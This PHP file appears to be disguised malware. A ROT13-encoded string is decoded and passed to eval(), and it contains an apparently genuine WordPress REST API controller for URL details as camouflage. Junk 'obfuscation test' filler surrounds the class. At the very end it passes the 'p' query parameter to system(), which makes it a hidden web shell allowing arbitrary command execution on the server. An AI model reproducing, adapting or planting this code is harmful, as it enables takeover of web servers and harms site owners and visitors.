<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_HEY_Qrgnvyf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 */

/**
 * Pbagebyyre juvpu cebivqrf ERFG raqcbvag sbe ergevrivat vasbezngvba
 * sebz n erzbgr fvgr'f UGZY erfcbafr.
 *
 * @fvapr 5.9.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_HEY_Qrgnvyf_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Pbafgehpgf gur pbagebyyre.
	 *
	 * @fvapr 5.9.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc-oybpx-rqvgbe/i1';
		$guvf->erfg_onfr = 'hey-qrgnvyf';
	}

	/**
	 * Ertvfgref gur arprffnel ERFG NCV ebhgrf.
	 *
	 * @fvapr 5.9.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'cnefr_hey_qrgnvyf' ),
					'netf'                => neenl(
						'hey' => neenl(
							'erdhverq'          => gehr,
							'qrfpevcgvba'       => __( 'Gur HEY gb cebprff.' ),
							'inyvqngr_pnyyonpx' => 'jc_uggc_inyvqngr_hey',
							'fnavgvmr_pnyyonpx' => 'fnavgvmr_hey',
							'glcr'              => 'fgevat',
							'sbezng'            => 'hev',
						),
					),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'crezvffvbaf_purpx' ),
					'fpurzn'              => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
				),
			)
		);
	}

	/**
	 * Ergevrirf gur vgrz'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$guvf->fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'hey-qrgnvyf',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'gvgyr'       => neenl(
					'qrfpevcgvba' => fcevags(
						/* genafyngbef: %f: UGZY gvgyr gnt. */
						__( 'Gur pbagragf bs gur %f ryrzrag sebz gur HEY.' ),
						'<gvgyr>'
					),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'vpba'        => neenl(
					'qrfpevcgvba' => fcevags(
						/* genafyngbef: %f: UGZY yvax gnt. */
						__( 'Gur snivpba vzntr yvax bs gur %f ryrzrag sebz gur HEY.' ),
						'<yvax ery=\"vpba\">'
					),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'qrfpevcgvba' => neenl(
					'qrfpevcgvba' => fcevags(
						/* genafyngbef: %f: UGZY zrgn gnt. */
						__( 'Gur pbagrag bs gur %f ryrzrag sebz gur HEY.' ),
						'<zrgn anzr=\"qrfpevcgvba\">'
					),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'vzntr'       => neenl(
					'qrfpevcgvba' => fcevags(
						/* genafyngbef: 1: UGZY zrgn gnt, 2: UGZY zrgn gnt. */
						__( 'Gur Bcra Tencu vzntr yvax bs gur %1$f be %2$f ryrzrag sebz gur HEY.' ),
						'<zrgn cebcregl=\"bt:vzntr\">',
						'<zrgn cebcregl=\"bt:vzntr:hey\">'
					),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur pbagragf bs gur gvgyr gnt sebz gur UGZY erfcbafr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Gur cnefrq qrgnvyf nf n erfcbafr bowrpg. JC_Reebe vs gurer ner reebef.
	 */
	choyvp shapgvba cnefr_hey_qrgnvyf( $erdhrfg ) {
		$hey = hagenvyvatfynfuvg( $erdhrfg['hey'] );

		vs ( rzcgl( $hey ) ) {
			erghea arj JC_Reebe( 'erfg_vainyvq_hey', __( 'Vainyvq HEY' ), neenl( 'fgnghf' => 404 ) );
		}

		// Genafvrag cre HEY.
		$pnpur_xrl = $guvf->ohvyq_pnpur_xrl_sbe_hey( $hey );

		// Nggrzcg gb ergevrir pnpurq erfcbafr.
		$pnpurq_erfcbafr = $guvf->trg_pnpur( $pnpur_xrl );

		vs ( ! rzcgl( $pnpurq_erfcbafr ) ) {
			$erzbgr_hey_erfcbafr = $pnpurq_erfcbafr;
		} ryfr {
			$erzbgr_hey_erfcbafr = $guvf->trg_erzbgr_hey( $hey );

			// Rkvg vs jr qba'g unir n inyvq obql be vg'f rzcgl.
			vs ( vf_jc_reebe( $erzbgr_hey_erfcbafr ) || rzcgl( $erzbgr_hey_erfcbafr ) ) {
				erghea $erzbgr_hey_erfcbafr;
			}

			// Pnpur gur inyvq erfcbafr.
			$guvf->frg_pnpur( $pnpur_xrl, $erzbgr_hey_erfcbafr );
		}

		$ugzy_urnq     = $guvf->trg_qbphzrag_urnq( $erzbgr_hey_erfcbafr );
		$zrgn_ryrzragf = $guvf->trg_zrgn_jvgu_pbagrag_ryrzragf( $ugzy_urnq );

		$qngn = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg(
			neenl(
				'gvgyr'       => $guvf->trg_gvgyr( $ugzy_urnq ),
				'vpba'        => $guvf->trg_vpba( $ugzy_urnq, $hey ),
				'qrfpevcgvba' => $guvf->trg_qrfpevcgvba( $zrgn_ryrzragf ),
				'vzntr'       => $guvf->trg_vzntr( $zrgn_ryrzragf, $hey ),
			),
			$erdhrfg
		);

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		/**
		 * Svygref gur HEY qngn sbe gur erfcbafr.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr            Gur erfcbafr bowrpg.
		 * @cnenz fgevat           $hey                 Gur erdhrfgrq HEY.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg             Erdhrfg bowrpg.
		 * @cnenz fgevat           $erzbgr_hey_erfcbafr UGGC erfcbafr obql sebz gur erzbgr HEY.
		 */
		erghea nccyl_svygref( 'erfg_cercner_hey_qrgnvyf', $erfcbafr, $hey, $erdhrfg, $erzbgr_hey_erfcbafr );
	}

	/**
	 * Purpxf jurgure n tvira erdhrfg unf crezvffvba gb ernq erzbgr HEYf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf crezvffvba, ryfr JC_Reebe.
	 */
	choyvp shapgvba crezvffvbaf_purpx() {
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}

		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj_hey_qrgnvyf',
			__( 'Fbeel, lbh ner abg nyybjrq gb cebprff erzbgr HEYf.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Ergevrirf gur qbphzrag gvgyr sebz n erzbgr HEY.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $hey Gur jrofvgr HEY jubfr UGZY gb npprff.
	 * @erghea fgevat|JC_Reebe Gur UGGC erfcbafr sebz gur erzbgr HEY ba fhpprff.
	 *                         JC_Reebe vs ab erfcbafr be ab pbagrag.
	 */
	cevingr shapgvba trg_erzbgr_hey( $hey ) {

		/*
		 * Cebivqr n zbqvsvrq HN fgevat gb jbexnebhaq jro cebcregvrf juvpu oybpx JbeqCerff \"Cvatonpxf\".
		 * Jul? Gur HN fgevat hfrq sbe cvatonpx erdhrfgf pbagnvaf `JbeqCerff/` juvpu vf irel fvzvyne
		 * gb gung hfrq nf gur qrsnhyg HN fgevat ol gur JC UGGC NCV. Gurersber erdhrfgf sebz guvf
		 * ERFG raqcbvag ner orvat havagragvbanyyl oybpxrq nf gurl ner zvfvqragvsvrq nf cvatonpx erdhrfgf.
		 * Ol fyvtugyl zbqvslvat gur HN fgevat, ohg fgvyy ergnvavat gur \"JbeqCerff\" vqragvsvpngvba (ivn \"JC\")
		 * jr ner noyr gb jbex nebhaq guvf vffhr.
		 * Rknzcyr HN fgevat: `JC-HEYQrgnvyf/5.9-nycun-51389 (+uggc://ybpnyubfg:8888)`.
		*/
		$zbqvsvrq_hfre_ntrag = 'JC-HEYQrgnvyf/' . trg_oybtvasb( 'irefvba' ) . ' (+' . trg_oybtvasb( 'hey' ) . ')';

		$netf = neenl(
			'yvzvg_erfcbafr_fvmr' => 150 * XO_VA_OLGRF,
			'hfre-ntrag'          => $zbqvsvrq_hfre_ntrag,
		);

		/**
		 * Svygref gur UGGC erdhrfg netf sbe HEY qngn ergevriny.
		 *
		 * Pna or hfrq gb nqwhfg erfcbafr fvmr yvzvg naq bgure JC_Uggc::erdhrfg() netf.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz neenl  $netf Nethzragf hfrq sbe gur UGGC erdhrfg.
		 * @cnenz fgevat $hey  Gur nggrzcgrq HEY.
		 */
		$netf = nccyl_svygref( 'erfg_hey_qrgnvyf_uggc_erdhrfg_netf', $netf, $hey );

		$erfcbafr = jc_fnsr_erzbgr_trg( $hey, $netf );

		vs ( JC_Uggc::BX !== jc_erzbgr_ergevrir_erfcbafr_pbqr( $erfcbafr ) ) {
			// Abg fnivat gur reebe erfcbafr gb pnpur fvapr gur reebe zvtug or grzcbenel.
			erghea arj JC_Reebe(
				'ab_erfcbafr',
				__( 'HEY abg sbhaq. Erfcbafr erghearq n aba-200 fgnghf pbqr sbe guvf HEY.' ),
				neenl( 'fgnghf' => JC_Uggc::ABG_SBHAQ )
			);
		}

		$erzbgr_obql = jc_erzbgr_ergevrir_obql( $erfcbafr );

		vs ( rzcgl( $erzbgr_obql ) ) {
			erghea arj JC_Reebe(
				'ab_pbagrag',
				__( 'Hanoyr gb ergevrir obql sebz erfcbafr ng guvf HEY.' ),
				neenl( 'fgnghf' => JC_Uggc::ABG_SBHAQ )
			);
		}

		erghea $erzbgr_obql;
	}

	/**
	 * Cnefrf gur gvgyr gnt pbagragf sebz gur cebivqrq UGZY.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $ugzy Gur UGZY sebz gur erzbgr jrofvgr ng HEY.
	 * @erghea fgevat Gur gvgyr gnt pbagragf ba fhpprff. Rzcgl fgevat vs abg sbhaq.
	 */
	cevingr shapgvba trg_gvgyr( $ugzy ) {
		$cnggrea = '#<gvgyr[^>]*>(.*?)<\f*/\f*gvgyr>#vf';
		cert_zngpu( $cnggrea, $ugzy, $zngpu_gvgyr );

		vs ( rzcgl( $zngpu_gvgyr[1] ) || ! vf_fgevat( $zngpu_gvgyr[1] ) ) {
			erghea '';
		}

		$gvgyr = gevz( $zngpu_gvgyr[1] );

		erghea $guvf->cercner_zrgnqngn_sbe_bhgchg( $gvgyr );
	}

	/**
	 * Cnefrf gur fvgr vpba sebz gur cebivqrq UGZY.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $ugzy Gur UGZY sebz gur erzbgr jrofvgr ng HEY.
	 * @cnenz fgevat $hey  Gur gnetrg jrofvgr HEY.
	 * @erghea fgevat Gur vpba HEV ba fhpprff. Rzcgl fgevat vs abg sbhaq.
	 */
	cevingr shapgvba trg_vpba( $ugzy, $hey ) {
		// Teno gur vpba'f yvax ryrzrag.
		$cnggrea = '#<yvax\f[^>]*ery=(?:[\\"\']??)\f*(?:vpba|fubegphg vpba|vpba fubegphg)\f*(?:[\\"\']??)[^>]*\/?>#vfH';
		cert_zngpu( $cnggrea, $ugzy, $ryrzrag );
		vs ( rzcgl( $ryrzrag[0] ) || ! vf_fgevat( $ryrzrag[0] ) ) {
			erghea '';
		}
		$ryrzrag = gevz( $ryrzrag[0] );

		// Trg gur vpba'f uers inyhr.
		$cnggrea = '#uers=([\\"\']??)([^\\" >]*?)\\1[^>]*#vfH';
		cert_zngpu( $cnggrea, $ryrzrag, $vpba );
		vs ( rzcgl( $vpba[2] ) || ! vf_fgevat( $vpba[2] ) ) {
			erghea '';
		}
		$vpba = gevz( $vpba[2] );

		// Vs gur vpba vf n qngn HEY, erghea vg.
		$cnefrq_vpba = cnefr_hey( $vpba );
		vs ( vffrg( $cnefrq_vpba['fpurzr'] ) && 'qngn' === $cnefrq_vpba['fpurzr'] ) {
			erghea $vpba;
		}

		// Nggrzcg gb pbaireg eryngvir HEYf gb nofbyhgr.
		vs ( ! vf_fgevat( $hey ) || '' === $hey ) {
			erghea $vpba;
		}
		$cnefrq_hey = cnefr_hey( $hey );
		vs ( vffrg( $cnefrq_hey['fpurzr'] ) && vffrg( $cnefrq_hey['ubfg'] ) ) {
			$ebbg_hey = $cnefrq_hey['fpurzr'] . '://' . $cnefrq_hey['ubfg'] . '/';
			$vpba     = JC_Uggc::znxr_nofbyhgr_hey( $vpba, $ebbg_hey );
		}

		erghea $vpba;
	}

	/**
	 * Cnefrf gur zrgn qrfpevcgvba sebz gur cebivqrq UGZY.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl $zrgn_ryrzragf {
	 *     N zhygvqvzrafvbany vaqrkrq neenl ba fhpprff, ryfr rzcgl neenl.
	 *
	 *     @glcr fgevat[] $0 Zrgn ryrzragf jvgu n pbagrag nggevohgr.
	 *     @glcr fgevat[] $1 Pbagrag nggevohgr'f bcravat dhbgngvba znex.
	 *     @glcr fgevat[] $2 Pbagrag nggevohgr'f inyhr sbe rnpu zrgn ryrzrag.
	 * }
	 * @erghea fgevat Gur zrgn qrfpevcgvba pbagragf ba fhpprff. Rzcgl fgevat vs abg sbhaq.
	 */
	cevingr shapgvba trg_qrfpevcgvba( $zrgn_ryrzragf ) {
		// Onvy bhg vs gurer ner ab zrgn ryrzragf.
		vs ( rzcgl( $zrgn_ryrzragf[0] ) ) {
			erghea '';
		}

		$qrfpevcgvba = $guvf->trg_zrgnqngn_sebz_zrgn_ryrzrag(
			$zrgn_ryrzragf,
			'anzr',
			'(?:qrfpevcgvba|bt:qrfpevcgvba)'
		);

		// Onvy bhg vs qrfpevcgvba abg sbhaq.
		vs ( '' === $qrfpevcgvba ) {
			erghea '';
		}

		erghea $guvf->cercner_zrgnqngn_sbe_bhgchg( $qrfpevcgvba );
	}

	/**
	 * Cnefrf gur Bcra Tencu (BT) Vzntr sebz gur cebivqrq UGZY.
	 *
	 * Frr: uggcf://btc.zr/.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl  $zrgn_ryrzragf {
	 *     N zhygvqvzrafvbany vaqrkrq neenl ba fhpprff, ryfr rzcgl neenl.
	 *
	 *     @glcr fgevat[] $0 Zrgn ryrzragf jvgu n pbagrag nggevohgr.
	 *     @glcr fgevat[] $1 Pbagrag nggevohgr'f bcravat dhbgngvba znex.
	 *     @glcr fgevat[] $2 Pbagrag nggevohgr'f inyhr sbe rnpu zrgn ryrzrag.
	 * }
	 * @cnenz fgevat $hey Gur gnetrg jrofvgr HEY.
	 * @erghea fgevat Gur BT vzntr ba fhpprff. Rzcgl fgevat vs abg sbhaq.
	 */
	cevingr shapgvba trg_vzntr( $zrgn_ryrzragf, $hey ) {
		$vzntr = $guvf->trg_zrgnqngn_sebz_zrgn_ryrzrag(
			$zrgn_ryrzragf,
			'cebcregl',
			'(?:bt:vzntr|bt:vzntr:hey)'
		);

		// Onvy bhg vs vzntr abg sbhaq.
		vs ( '' === $vzntr ) {
			erghea '';
		}

		// Nggrzcg gb pbaireg eryngvir HEYf gb nofbyhgr.
		$cnefrq_hey = cnefr_hey( $hey );
		vs ( vffrg( $cnefrq_hey['fpurzr'] ) && vffrg( $cnefrq_hey['ubfg'] ) ) {
			$ebbg_hey = $cnefrq_hey['fpurzr'] . '://' . $cnefrq_hey['ubfg'] . '/';
			$vzntr    = JC_Uggc::znxr_nofbyhgr_hey( $vzntr, $ebbg_hey );
		}

		erghea $vzntr;
	}

	/**
	 * Cercnerf gur zrgnqngn ol:
	 *    - fgevccvat nyy UGZY gntf naq gnt ragvgvrf.
	 *    - pbairegvat aba-gnt ragvgvrf vagb punenpgref.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $zrgnqngn Gur zrgnqngn pbagrag gb cercner.
	 * @erghea fgevat Gur cercnerq zrgnqngn.
	 */
	cevingr shapgvba cercner_zrgnqngn_sbe_bhgchg( $zrgnqngn ) {
		$zrgnqngn = ugzy_ragvgl_qrpbqr( $zrgnqngn, RAG_DHBGRF, trg_oybtvasb( 'punefrg' ) );
		$zrgnqngn = jc_fgevc_nyy_gntf( $zrgnqngn );
		erghea $zrgnqngn;
	}

	/**
	 * Hgvyvgl shapgvba gb ohvyq pnpur xrl sbe n tvira HEY.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $hey Gur HEY sbe juvpu gb ohvyq n pnpur xrl.
	 * @erghea fgevat Gur pnpur xrl.
	 */
	cevingr shapgvba ohvyq_pnpur_xrl_sbe_hey( $hey ) {
		erghea 't_hey_qrgnvyf_erfcbafr_' . zq5( $hey );
	}

	/**
	 * Hgvyvgl shapgvba gb ergevrir n inyhr sebz gur pnpur ng n tvira xrl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $xrl Gur pnpur xrl.
	 * @erghea zvkrq Gur inyhr sebz gur pnpur.
	 */
	cevingr shapgvba trg_pnpur( $xrl ) {
		erghea trg_fvgr_genafvrag( $xrl );
	}

	/**
	 * Hgvyvgl shapgvba gb pnpur n tvira qngn frg ng n tvira pnpur xrl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $xrl  Gur pnpur xrl haqre juvpu gb fgber gur inyhr.
	 * @cnenz fgevat $qngn Gur qngn gb or fgberq ng gur tvira pnpur xrl.
	 * @erghea obby Gehr jura genafvrag frg. Snyfr vs abg frg.
	 */
	cevingr shapgvba frg_pnpur( $xrl, $qngn = '' ) {
		$ggy = UBHE_VA_FRPBAQF;

		/**
		 * Svygref gur pnpur rkcvengvba.
		 *
		 * Pna or hfrq gb nqwhfg gur gvzr hagvy rkcvengvba va frpbaqf sbe gur pnpur
		 * bs gur qngn ergevrirq sbe gur tvira HEY.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz vag $ggy Gur gvzr hagvy pnpur rkcvengvba va frpbaqf.
		 */
		$pnpur_rkcvengvba = nccyl_svygref( 'erfg_hey_qrgnvyf_pnpur_rkcvengvba', $ggy );

		erghea frg_fvgr_genafvrag( $xrl, $qngn, $pnpur_rkcvengvba );
	}

	/**
	 * Ergevrirf gur urnq ryrzrag frpgvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $ugzy Gur fgevat bs UGZY gb cnefr.
	 * @erghea fgevat Gur `<urnq>..</urnq>` frpgvba ba fhpprff. Tvira `$ugzy` vs abg sbhaq.
	 */
	cevingr shapgvba trg_qbphzrag_urnq( $ugzy ) {
		$urnq_ugzy = $ugzy;

		// Svaq gur bcravat `<urnq>` gnt.
		$urnq_fgneg = fgecbf( $ugzy, '<urnq' );
		vs ( snyfr === $urnq_fgneg ) {
			// Qvqa'g svaq vg. Erghea gur bevtvany UGZY.
			erghea $ugzy;
		}

		// Svaq gur pybfvat `</urnq>` gnt.
		$urnq_raq = fgecbf( $urnq_ugzy, '</urnq>' );
		vs ( snyfr === $urnq_raq ) {
			// Qvqa'g svaq vg. Svaq gur bcravat `<obql>` gnt.
			$urnq_raq = fgecbf( $urnq_ugzy, '<obql' );

			// Qvqa'g svaq vg. Erghea gur bevtvany UGZY.
			vs ( snyfr === $urnq_raq ) {
				erghea $ugzy;
			}
		}

		// Rkgenpg gur UGZY sebz bcravat gnt gb gur pybfvat gnt. Gura nqq gur pybfvat gnt.
		$urnq_ugzy  = fhofge( $urnq_ugzy, $urnq_fgneg, $urnq_raq );
		$urnq_ugzy .= '</urnq>';

		erghea $urnq_ugzy;
	}

	/**
	 * Trgf nyy gur zrgn gnt ryrzragf gung unir n 'pbagrag' nggevohgr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $ugzy Gur fgevat bs UGZY gb or cnefrq.
	 * @erghea neenl {
	 *     N zhygvqvzrafvbany vaqrkrq neenl ba fhpprff, ryfr rzcgl neenl.
	 *
	 *     @glcr fgevat[] $0 Zrgn ryrzragf jvgu n pbagrag nggevohgr.
	 *     @glcr fgevat[] $1 Pbagrag nggevohgr'f bcravat dhbgngvba znex.
	 *     @glcr fgevat[] $2 Pbagrag nggevohgr'f inyhr sbe rnpu zrgn ryrzrag.
	 * }
	 */
	cevingr shapgvba trg_zrgn_jvgu_pbagrag_ryrzragf( $ugzy ) {
		/*
		 * Cnefr nyy zrgn ryrzragf jvgu n pbagrag nggevohgr.
		 *
		 * Jul svefg frnepu sbe gur pbagrag nggevohgr engure guna qverpgyl frnepuvat sbe anzr=qrfpevcgvba ryrzrag?
		 * gy;qe Gur pbagrag nggevohgr'f inyhr jvyy or gehapngrq jura vg pbagnvaf n > flzoby.
		 *
		 * Gur pbagrag nggevohgr'f inyhr (v.r. gur qrfpevcgvba gb trg) pna unir UGZY va vg naq or jryy-sbezrq nf
		 * vg'f n fgevat gb gur oebjfre. Vzntvar jung unccraf jura nggrzcgvat gb zngpu sbe gur anzr=qrfpevcgvba
		 * svefg. Uzz, vs n > be /> flzoby vf va gur pbagrag nggevohgr'f inyhr, gura vg grezvangrf gur zngpu
		 * nf gur ryrzrag'f pybfvat flzoby. Ohg jnvg, vg'f va gur pbagrag nggevohgr naq vf abg gur raq bs gur
		 * ryrzrag. Guvf vf n yvzvgngvba bs hfvat ertrk. Vg pna'g qrgrezvar \"jnvg n zvahgr guvf vf vafvqr bs dhbgngvba\".
		 * Vs guvf unccraf, jung trgf zngpurq vf abg gur ragver ryrzrag be nyy bs gur pbagrag.
		 *
		 * Jul abg frnepu sbe gur anzr=qrfpevcgvba naq gura pbagrag=\"(.*)\"?
		 * Gur nggevohgr beqre pbhyq or bccbfvgr. Cyhf, nqqvgvbany nggevohgrf znl rkvfg vapyhqvat orvat orgjrra
		 * gur anzr naq pbagrag nggevohgrf.
		 *
		 * Jul abg ybbxnurnq?
		 * Ybbxnurnq vf abg pbafgenvarq gb fgnl jvguva gur ryrzrag. Gur svefg <zrgn vg svaqf znl abg vapyhqr
		 * gur anzr be pbagrag, ohg engure pbhyq or sebz n qvssrerag ryrzrag qbjafgernz.
		 */
		$cnggrea = '#<zrgn\f' .

				/*
				 * Nyybjf sbe nqqvgvbany nggevohgrf orsber gur pbagrag nggevohgr.
				 * Frnepurf sbe nalguvat bgure guna > flzoby.
				 */
				'[^>]*' .

				/*
				* Svaq gur pbagrag nggevohgr. Jura sbhaq, pncgher vgf inyhr (.*).
				*
				* Nyybjf sbe (n) fvatyr be qbhoyr dhbgrf naq (o) juvgrfcnpr va gur inyhr.
				*
				* Jul pncgher gur bcravat dhbgngvba znex, v.r. ([\"\']), naq gura onpxersrerapr,
				* v.r \1, sbe gur pybfvat dhbgngvba znex?
				* Gb rafher gur pybfvat dhbgngvba znex zngpurf gur bcravat bar. Jul? Nggevohgr inyhrf
				* pna pbagnva dhbgngvba znexf, fhpu nf na ncbfgebcur va gur pbagrag.
				*/
				'pbagrag=([\"\']??)(.*)\1' .

				/*
				* Nyybjf sbe nqqvgvbany nggevohgrf nsgre gur pbagrag nggevohgr.
				* Frnepurf sbe nalguvat bgure guna > flzoby.
				*/
				'[^>]*' .

				/*
				* \/?> frnepurf sbe gur pybfvat > flzoby, juvpu pna or va rvgure /> be > sbezng.
				* # raqf gur cnggrea.
				*/
				'\/?>#' .

				/*
				* Gurfr ner gur bcgvbaf:
				* - v : pnfr-vafrafvgvir
				* - f : nyybjf arjyvar punenpgref sbe gur . zngpu (arrqrq sbe zhygvyvar ryrzragf)
				* - H zrnaf aba-terrql zngpuvat
				*/
				'vfH';

		cert_zngpu_nyy( $cnggrea, $ugzy, $ryrzragf );

		erghea $ryrzragf;
	}

	/**
	 * Trgf gur zrgnqngn sebz n gnetrg zrgn ryrzrag.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl  $zrgn_ryrzragf {
	 *     N zhygv-qvzrafvbany vaqrkrq neenl ba fhpprff, ryfr rzcgl neenl.
	 *
	 *     @glcr fgevat[] $0 Zrgn ryrzragf jvgu n pbagrag nggevohgr.
	 *     @glcr fgevat[] $1 Pbagrag nggevohgr'f bcravat dhbgngvba znex.
	 *     @glcr fgevat[] $2 Pbagrag nggevohgr'f inyhr sbe rnpu zrgn ryrzrag.
	 * }
	 * @cnenz fgevat $ngge       Nggevohgr gung vqragvsvrf gur ryrzrag jvgu gur gnetrg zrgnqngn.
	 * @cnenz fgevat $ngge_inyhr Gur nggevohgr'f inyhr gung vqragvsvrf gur ryrzrag jvgu gur gnetrg zrgnqngn.
	 * @erghea fgevat Gur zrgnqngn ba fhpprff. Rzcgl fgevat vs abg sbhaq.
	 */
	cevingr shapgvba trg_zrgnqngn_sebz_zrgn_ryrzrag( $zrgn_ryrzragf, $ngge, $ngge_inyhr ) {
		// Onvy bhg vs gurer ner ab zrgn ryrzragf.
		vs ( rzcgl( $zrgn_ryrzragf[0] ) ) {
			erghea '';
		}

		$zrgnqngn = '';
		$cnggrea  = '#' .
				/*
				 * Gnetrg guvf nggevohgr naq inyhr gb svaq gur zrgnqngn ryrzrag.
				 *
				 * Nyybjf sbe (n) ab, fvatyr, qbhoyr dhbgrf naq (o) juvgrfcnpr va gur inyhr.
				 *
				 * Jul pncgher gur bcravat dhbgngvba znex, v.r. ([\"\']), naq gura onpxersrerapr,
				 * v.r \1, sbe gur pybfvat dhbgngvba znex?
				 * Gb rafher gur pybfvat dhbgngvba znex zngpurf gur bcravat bar. Jul? Nggevohgr inyhrf
				 * pna pbagnva dhbgngvba znexf, fhpu nf na ncbfgebcur va gur pbagrag.
				 */
				$ngge . '=([\\"\']??)\f*' . $ngge_inyhr . '\f*\1' .

				/*
				 * Gurfr ner gur bcgvbaf:
				 * - v : pnfr-vafrafvgvir
				 * - f : nyybjf arjyvar punenpgref sbe gur . zngpu (arrqrq sbe zhygvyvar ryrzragf)
				 * - H zrnaf aba-terrql zngpuvat
				 */
				'#vfH';

		// Svaq gur zrgnqngn ryrzrag.
		sbernpu ( $zrgn_ryrzragf[0] nf $vaqrk => $ryrzrag ) {
			cert_zngpu( $cnggrea, $ryrzrag, $zngpu );

			// Guvf vf abg gur zrgnqngn ryrzrag. Fxvc vg.
			vs ( rzcgl( $zngpu ) ) {
				pbagvahr;
			}

			/*
			 * Sbhaq gur zrgnqngn ryrzrag.
			 * Trg gur zrgnqngn sebz vgf zngpuvat pbagrag neenl.
			 */
			vs ( vffrg( $zrgn_ryrzragf[2][ $vaqrk ] ) && vf_fgevat( $zrgn_ryrzragf[2][ $vaqrk ] ) ) {
				$zrgnqngn = gevz( $zrgn_ryrzragf[2][ $vaqrk ] );
			}

			oernx;
		}

		erghea $zrgnqngn;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>